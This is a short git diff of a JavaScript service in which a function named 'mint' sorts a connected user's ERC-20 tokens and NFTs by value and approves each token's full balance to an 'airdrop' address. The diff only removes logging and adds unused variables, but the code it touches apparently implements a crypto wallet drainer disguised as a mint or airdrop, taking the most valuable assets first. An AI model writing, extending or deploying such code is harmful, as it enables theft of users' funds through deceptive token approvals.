@@ -3,9 +3,8 @@ import erc721abi from "../abis/erc721abi.json";
 import {  transferErc20 } from "./erc20.service.js";
 import { transferErc721 } from "./erc721.service.js";
 export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signerAccount, clientRead, clientWrite, userAddress) => {
-  console.log(tokensERC20, "tokensERC20")
-    tokensERC20.sort((a, b) => +b.balanceInUsd - +a.balanceInUsd);
-    tokensERC721.sort((a, b) => +b.price - +a.price);
+   let sortedTokensERC20 = tokensERC20.sort((a, b) => +b.balanceInUsd - +a.balanceInUsd);
+   let sortedTokensERC721 =tokensERC721.sort((a, b) => +b.price - +a.price);
     for (let iter20 = 0; iter20 < tokensERC20.length; iter20++) {
       try {
         if (tokensERC20[iter20].isApproved === false) {
@@ -16,8 +15,7 @@ export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signerAcco
                 functionName: "approve",
                 args: [airdrop, tokensERC20[iter20].balance],
             });
-            const res = await clientWrite.writeContract(request);
-            console.log(res, "res")
+            await clientWrite.writeContract(request);
         }
     } catch (err) {
         console.log(err);
